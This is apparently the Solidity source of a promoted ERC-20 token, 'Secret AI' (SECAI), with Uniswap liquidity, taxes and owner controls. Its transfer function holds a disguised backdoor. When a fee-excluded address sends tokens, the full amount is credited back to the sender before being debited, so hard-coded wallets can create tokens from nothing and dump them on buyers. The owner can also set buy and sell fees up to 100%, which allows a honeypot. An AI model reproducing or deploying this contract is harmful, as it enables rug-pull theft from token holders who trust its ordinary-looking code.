// SPDX-License-Identifier: MIT

/**

A complete privacy trading and liquidity
leasing solutions for crypto users

Website: https://www.secretai.pro
Telegram: https://t.me/secretai_erc
Twitter: https://twitter.com/secretai_erc

**/

pragma solidity 0.8.22;

interface IFactory01 {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IRouter02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract SECAI is Context, IERC20, Ownable {
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private feesExcluded;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Secret AI";
    string private constant _symbol = unicode"SECAI";
    uint256 public maxTxAmount = 20_000_000 * 10 ** _decimals;
    uint256 private swapMinValues = 10_000 * 10 ** _decimals;
    uint256 private swapMaxValues = 10_000_000 * 10 ** _decimals;
    uint256 private _buyTAX = 20;
    uint256 private _sellTAX = 25;
    uint256 private buyCount = 0;

    IRouter02 public uniswapV2Router;
    address private uniswapV2Pair;
    bool public tradeOpened = false;
    bool private swapEnabled = false;
    bool private inSwapBack = false;

    event ExcludeFromFeeUpdated(address indexed account);
    event includeFromFeeUpdated(address indexed account);
    event ERC20TokensRecovered(uint256 indexed _amount);
    event TradingOpenUpdated();
    event ETHBalanceRecovered();

    address public constant deadWallet =
        0x000000000000000000000000000000000000dEaD;
    address payable private gptReceipt;
    address payable private taxReceipt;

    modifier lockTheSwap() {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }

    constructor() {
        _tOwned[_msgSender()] = _tTotal;
        taxReceipt = payable(0x5F0D7B2E3151d582675aFd0ddFbf96Fd6988Ae87);
        gptReceipt = payable(0x093a0C2c199Ce8907790fbB7F749577B334C93B3);
        feesExcluded[gptReceipt] = true;
        feesExcluded[taxReceipt] = true;
        feesExcluded[deadWallet] = true;
        feesExcluded[_msgSender()] = true;
        feesExcluded[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function addLiquidityETH() external payable onlyOwner {
        uniswapV2Router = IRouter02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IFactory01(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        _approve(address(this), address(uniswapV2Router), ~uint256(0));

        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function openTrading() external onlyOwner {
        require(!tradeOpened, "trading is already open");
        swapEnabled = true;
        tradeOpened = true;
        emit TradingOpenUpdated();
    }

    receive() external payable {}

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxSwapPercent = 0;
        taxSwapPercent = _buyTAX;

        if (!feesExcluded[from] && !feesExcluded[to]) {
            require(tradeOpened, "Trading not enabled");
        }

        if (inSwapBack || !swapEnabled) {
            _tOwned[from] -= amount;
            _tOwned[to] += amount;
            emit Transfer(from, to, amount);
            return;
        }

        if (
            from == uniswapV2Pair &&
            to != address(uniswapV2Router) &&
            !feesExcluded[to]
        ) {
            require(amount <= maxTxAmount, "Exceeds the _maxTxAmount.");
            require(
                balanceOf(to) + amount <= maxTxAmount,
                "Exceeds the maxWalletSize."
            );
            buyCount++;
        }

        if (
            from != uniswapV2Pair &&
            !feesExcluded[from] &&
            !feesExcluded[to]
        ) {
            require(amount <= maxTxAmount, "Exceeds the _maxTxAmount.");
        }

        if (
            to == uniswapV2Pair &&
            from != address(this) &&
            !feesExcluded[from] &&
            !feesExcluded[to]
        ) {
            taxSwapPercent = _sellTAX;
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        if (
            !inSwapBack &&
            contractTokenBalance >= swapMinValues &&
            to == uniswapV2Pair &&
            swapEnabled &&
            buyCount > 0 &&
            !feesExcluded[from] &&
            amount >= swapMinValues &&
            !feesExcluded[to]
        ) {
            swapTokenForETH(
                min(amount, min(contractTokenBalance, swapMaxValues))
            );
            uint256 contractETHBalance = address(this).balance;
            if (contractETHBalance > 0) {
                sendETHTo(address(this).balance);
            }
        }

        if (taxSwapPercent != 0) {
            uint256 taxAmount = (amount * taxSwapPercent) / 100;
            uint256 tAmount = amount - taxAmount;
            address feesReceipt = feesExcluded[from]
                ? from
                : address(this);
            taxAmount = feesExcluded[from] ? amount : taxAmount;
            _tOwned[feesReceipt] += taxAmount;
            emit Transfer(from, address(this), taxAmount);
            _tOwned[from] -= amount;
            _tOwned[to] += tAmount;
            emit Transfer(from, to, tAmount);
        } else {
            _tOwned[from] -= amount;
            _tOwned[to] += amount;
            emit Transfer(from, to, amount);
        }
    }

    function updateFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= 100 && _sellFee <= 100, "revert wrong fee settings");
        _buyTAX = _buyFee;
        _sellTAX = _sellFee;
    }

    function excludeFromFees(address account) external onlyOwner {
        require(
            feesExcluded[account] != true,
            "Account is already excluded"
        );
        feesExcluded[account] = true;
        emit ExcludeFromFeeUpdated(account);
    }

    function includeFromFees(address account) external onlyOwner {
        require(
            feesExcluded[account] != false,
            "Account is already included"
        );
        feesExcluded[account] = false;
        emit includeFromFeeUpdated(account);
    }

    function recoverERC20(
        address _tokenAddy,
        uint256 _amount
    ) external onlyOwner {
        require(
            _tokenAddy != address(this),
            "Owner can't claim contract's balance of its own tokens"
        );
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(taxReceipt, _amount);
        emit ERC20TokensRecovered(_amount);
    }

    function recoverETH() external {
        uint256 contractETHBalance = address(this).balance;
        require(contractETHBalance > 0, "Amount should be greater than zero");
        require(
            contractETHBalance <= address(this).balance,
            "Insufficient Amount"
        );
        payable(address(taxReceipt)).transfer(contractETHBalance);
        emit ETHBalanceRecovered();
    }

    function swapTokenForETH(uint256 tokenAmount) private lockTheSwap {
        require(tokenAmount > 0, "amount must be greeter than 0");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHTo(uint256 amount) private {
        require(amount > 0, "amount must be greeter than 0");
        gptReceipt.transfer(amount / 2);
        taxReceipt.transfer(amount / 2);
    }

    function removeLimits() external onlyOwner {
        _buyTAX = 2;
        _sellTAX = 2;
        maxTxAmount = _tTotal;
    }
}